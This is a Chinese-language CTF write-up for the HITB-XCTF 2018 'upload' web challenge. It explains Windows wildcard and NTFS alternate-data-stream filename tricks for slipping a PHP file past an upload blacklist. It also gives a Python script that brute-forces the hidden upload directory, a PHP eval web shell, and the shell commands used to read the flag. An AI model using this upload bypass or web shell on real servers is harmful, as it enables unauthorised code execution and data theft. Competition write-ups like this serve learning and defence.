---
title: HITB-XCTF 2018 web writeup
tags: 
  - ctf
date: 2018-04-15 13:02:52
---

# upload

<!-- more -->
## 考点
windows平台的一些特性
- windows平台特性
windows下搜索文件用到的是FindFirstFile，该函数执行时，会将`"<" => "*"`、`">" => "?"`、`" => .`，所以在应用中，我们可以使用这个特性。e.g.
        `?filename=a>  =>  a?` 匹配单个字符
        `?filename=a<  =>  a*` 匹配多个字符
        `?filename=a"  =>  a.`

- NTFS ADS特性

| 上传的文件名 | 系统结果 |
| :-: | :-: |
| test.php:a.jpg | 生成test.php，但是无内容 |
| test.php::$DATA | 生成test.php，有内容 |
| test.php::$INDEX_ALLOCATION | 生成test.php文件夹  |
| test.php::$DATA.jpg | 生成0.jpg，有内容 |
| test.php::$DATA\test.jpg | 生成aaa.jpg，有内容  |

## 过程

- step 1:
功能点#文件上传 #上传文件宽高 => getshell
环境：IIS7.0 Windows Server 2008 Standard Edition Service Pack 2

- step 2:
文件上传功能黑名单php，文件名前缀时间戳重写，但截取上传文件名的最后一个后缀不变。简单利用ADS特性，上传test.php::$DATA

- step 3:
上传了文件后，需要找到文件目录。pic.php返回了上传文件宽和高，猜测其使用了getimagesize，想到前段时间的一篇[帖子](https://xianzhi.aliyun.com/forum/topic/2064)，写个脚本跑该复杂目录

```
#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Created by wh1t3P1g at 2018/4/11

import requests

str="0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
ret=""
for i in range(32):
    for c in str:
        t=ret+c
        url="http://47.90.97.18:9999/pic.php?filename=../"+t+"%3C/1523456340.jpg"
        r=requests.get(url)
        if "width" in r.content:
            ret+=c
            print ret
            break
```

得到目录87194f13726af7cee27ba2cfe97b60df

- step 4:
有了目录就能访问上传的一句话`<?php eval($_POST[cmd]);?>`，系统禁用了执行系统命令的一些函数，但是这里并不需要执行命令。
这里不截图了
`cmd=var_dump(glob("../*"));`得到flag.php，访问后发现需要读取flag.php的内容
`cmd=echo readfile("../flag.php");`得到flag

## 总结
这次就做了一道web，还有待提高和积累:)





